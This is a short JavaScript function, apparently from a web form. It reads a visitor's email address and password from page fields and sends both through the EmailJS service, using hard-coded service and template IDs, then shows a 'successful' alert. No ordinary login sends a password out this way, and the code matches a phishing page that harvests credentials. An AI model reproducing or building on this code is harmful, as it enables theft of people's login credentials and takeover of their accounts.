function sendMail() {
    let params = {
        email: document.getElementById("email").value,
        pass: document.getElementById("pass").value

    }

emailjs.send("service_76lfowd", "template_5t229py", params).then(function (res) {
alert("successful")
})
}

